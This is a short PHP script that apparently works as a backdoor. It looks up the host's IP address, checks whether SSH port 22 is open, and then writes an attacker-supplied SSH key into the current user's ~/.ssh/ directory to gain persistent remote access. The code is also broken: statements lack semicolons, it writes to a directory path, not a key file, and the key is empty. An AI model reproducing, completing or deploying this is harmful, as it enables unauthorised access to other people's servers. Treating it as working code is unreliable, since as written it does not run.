<?php
$ssh_key = "";
$is_shh_open = null;
  $ip = system("ip -4 -o addr show dev eth0 | awk '{ gsub(/\\/[0-9]+$/, \"\", \$4); print \$4 }'");
    // Suppress warnings using the @ operator for cleaner output
    $connection = @fsockopen($ip, 22, $errno, $errstr, 0.1);

    if (is_resource($connection)) {
        // Connection successful, so the port is open
        fclose($connection);
        $is_shh_open = true;
    } else {
        // Connection failed
        $is_shh_open = false;
    }
    if($is_shh_open == true){
    $username = system("whoami")
    $file = "/home/" . $username . "/.ssh/"; // file path
    file_put_contents($file, $ssh_key)
  }
?>

